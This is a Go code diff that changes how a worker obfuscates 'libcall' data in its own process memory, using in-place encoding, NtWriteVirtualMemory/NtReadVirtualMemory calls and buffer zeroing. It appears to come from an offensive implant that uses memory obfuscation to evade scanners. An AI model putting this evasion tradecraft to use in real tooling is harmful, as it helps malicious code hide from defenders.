@@ -313,33 +313,36 @@ func (w *Worker) encryptSharedMem() {
 		return
 	}
 	
-	encryptedData := obf.Encode(libcallData)
+    // Encrypt in place to minimize allocations
+    obf.EncodeInPlace(libcallData)
 	
 	var bytesWritten uintptr
-	status, err = NtWriteVirtualMemory(
-		0xFFFFFFFFFFFFFFFF, // Current process
-		w.sharedMem,
-		uintptr(unsafe.Pointer(&encryptedData[0])),
-		libcallSize,
-		&bytesWritten,
-	)
+    status, err = NtWriteVirtualMemory(
+        0xFFFFFFFFFFFFFFFF, // Current process
+        w.sharedMem,
+        uintptr(unsafe.Pointer(&libcallData[0])),
+        libcallSize,
+        &bytesWritten,
+    )
 	
-	if err != nil || status != 0 || bytesWritten != libcallSize {
-		NtWriteVirtualMemory(
-			0xFFFFFFFFFFFFFFFF,
-			w.sharedMem,
-			uintptr(unsafe.Pointer(&libcallData[0])),
-			libcallSize,
-			&bytesWritten,
-		)
-	}
+    if err != nil || status != 0 || bytesWritten != libcallSize {
+        NtWriteVirtualMemory(
+            0xFFFFFFFFFFFFFFFF,
+            w.sharedMem,
+            uintptr(unsafe.Pointer(&libcallData[0])),
+            libcallSize,
+            &bytesWritten,
+        )
+    }
+    // Zeroize sensitive buffers
+    for i := range libcallData { libcallData[i] = 0 }
 }
 
 func (w *Worker) decryptSharedMem() {
 	w.sharedMemMtx.Lock()
 	defer w.sharedMemMtx.Unlock()
 	
-	encryptedData := make([]byte, libcallSize)
+    encryptedData := make([]byte, libcallSize)
 	var bytesRead uintptr
 	status, err := NtReadVirtualMemory(
 		0xFFFFFFFFFFFFFFFF, // Current process
@@ -353,21 +356,24 @@ func (w *Worker) decryptSharedMem() {
 		return
 	}
 	
-	decryptedData := obf.Decode(encryptedData)
+    // Decrypt in place
+    obf.EncodeInPlace(encryptedData)
 	
 	var bytesWritten uintptr
-	status, err = NtWriteVirtualMemory(
-		0xFFFFFFFFFFFFFFFF, // Current process
-		w.sharedMem,
-		uintptr(unsafe.Pointer(&decryptedData[0])),
-		libcallSize,
-		&bytesWritten,
-	)
+    status, err = NtWriteVirtualMemory(
+        0xFFFFFFFFFFFFFFFF, // Current process
+        w.sharedMem,
+        uintptr(unsafe.Pointer(&encryptedData[0])),
+        libcallSize,
+        &bytesWritten,
+    )
 	
-	if err != nil || status != 0 || bytesWritten != libcallSize {
-		// we should never get here, kill ourselves
-		runtime.Goexit()
-	}
+    if err != nil || status != 0 || bytesWritten != libcallSize {
+        // we should never get here, kill ourselves
+        runtime.Goexit()
+    }
+    // Zeroize sensitive buffers
+    for i := range encryptedData { encryptedData[i] = 0 }
 }
 
 func workerDispatcher() {
